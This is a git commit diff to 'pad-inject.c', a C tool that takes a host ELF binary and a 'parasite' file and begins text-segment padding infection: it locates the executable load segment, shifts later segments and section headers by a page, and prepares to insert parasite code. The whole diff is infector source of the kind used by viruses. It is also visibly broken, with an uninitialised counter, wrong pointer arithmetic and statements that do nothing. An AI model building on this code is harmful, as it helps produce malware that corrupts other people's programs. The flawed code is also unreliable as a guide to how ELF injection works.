266d3fdba525cdd5fce2758bcb602cdd74d1ca66
Nick Stephens <nick.stephens93@gmail.com>
2013-09-02 17:19:00 -0700

    Modify elf in pad-inject

--- pad-inject.c
+++ pad-inject.c
@@ -13,17 +13,20 @@
 #define TMP "tmp.bin"
 
 int hfd, pfd;
+int patch_position;
 struct stat hst, pst;
 
 void infect_elf();
 
 int main(int argc, char **argv)
 {
-    if (argc != 3)
+    if (argc != 4)
     {
-        printf("usage: %s <host> <parasite>\n", argv[0]);
+        printf("usage: %s <host> <parasite> <patch-position>\n", argv[0]);
         exit(1);
     }
+
+    patch_position = atoi(argv[3]);
 
     if ((hfd = open(argv[1], O_RDONLY)) == -1) 
     {
@@ -55,10 +58,16 @@ int main(int argc, char **argv)
 void infect_elf()
 {
     
+    unsigned long entry_point, text_offset;
     unsigned char *mem;
+    unsigned int entry_offset;
+    int psize;
     Elf32_Ehdr *e_hdr;
     Elf32_Phdr *p_hdr;
     Elf32_Shdr *s_hdr;
+    int i;
+
+    psize = pst.st_size;
 
     mem = mmap(NULL, hst.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, hfd, 0);
     if (mem == MAP_FAILED)
@@ -74,5 +83,39 @@ void infect_elf()
         printf("host is not an ELF\n");
         exit(-1);
     }
+
+    int text_found;
+    p_hdr = (Elf32_Phdr *) mem + e_hdr->e_phoff;
+
+    // iterate over phdrs looking for the text segment
+    for (i = e_hdr->e_phnum; i-- > 0; p_hdr++)
+    {
+        if (text_found)
+        {
+            // while (psize > PAGE_SIZE) {
+            p_hdr->p_offset += PAGE_SIZE;
+            p_hdr->p_vaddr += PAGE_SIZE;
+            // psize -= PAGE_SIZE
+        }
+
+        if (p_hdr->p_type == PT_LOAD)
+            if (p_hdr->p_flags == (PF_R | PF_X))
+            {
+                text_found++;
+                text_offset = p_hdr->p_offset;
+                entry_offset = p_hdr->p_filesz;
+                p_hdr->p_filesz + psize;
+                p_hdr->p_memsz + psize;
+            }
+    }
+
+    // will the section header table have to be pushed?
+    s_hdr = (Elf32_Shdr *) mem + e_hdr->e_shoff;
+    for (i = e_hdr->e_shnum; i-- > 0; s_hdr++)
+    {
+        if (s_hdr->sh_offset > text_offset)
+            s_hdr->sh_offset += PAGE_SIZE;
+    }
+        
 }
 
